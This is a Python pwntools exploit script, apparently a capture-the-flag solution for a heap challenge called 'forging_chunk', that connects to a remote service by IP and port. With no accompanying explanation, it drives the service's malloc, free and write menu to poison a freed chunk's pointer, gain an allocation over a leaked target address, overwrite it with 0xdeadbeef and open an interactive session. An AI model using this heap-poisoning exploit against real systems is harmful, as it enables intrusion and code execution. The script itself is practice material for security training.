from pwn import *

ip = "140.110.112.77"
port = 9001

context.arch = "amd64"

r = remote(ip, port)
# r = process("./forging_chunk")

def Free(idx):
    r.sendlineafter(":", "0")
    r.sendlineafter("x = ", str(idx))

def Malloc(idx):
    r.sendlineafter(":", "1")
    r.sendlineafter("x = ", str(idx))
    r.recvuntil(":")
    return int(r.recvline()[:-1], 16)

def Write(idx, data):
    r.sendlineafter(":", "2")
    r.sendlineafter("x = ", str(idx))
    r.sendlineafter("=", data)

r.recvuntil(":")
victim = int(r.recvline()[:-1], 16)
log.info(hex(victim))
r.recvuntil(":")
sz = int(r.recvline()[:-1], 16)

Malloc(0)
Malloc(1)
Free(0)
Free(1)

Write(1, p64(sz - 0x8))
Malloc(0)
Malloc(1)

Write(1, p64(0xdeadbeef))
r.sendlineafter(":", "87")

r.interactive()
